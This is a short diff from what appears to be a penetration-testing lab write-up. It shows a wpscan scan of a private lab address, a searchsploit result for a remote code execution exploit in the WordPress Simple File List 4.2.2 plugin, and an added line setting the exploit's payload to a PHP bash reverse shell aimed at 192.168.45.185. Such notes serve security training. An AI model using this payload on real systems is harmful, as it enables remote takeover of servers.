@@ -340,7 +340,9 @@ wpscan --url http://192.168.231.105
 searchsploit simple file list
 WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                                                           | php/webapps/48449.py
 
-
+# exploit
+vi 48449.py
+payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'
 ```
 
 ### Cockpit
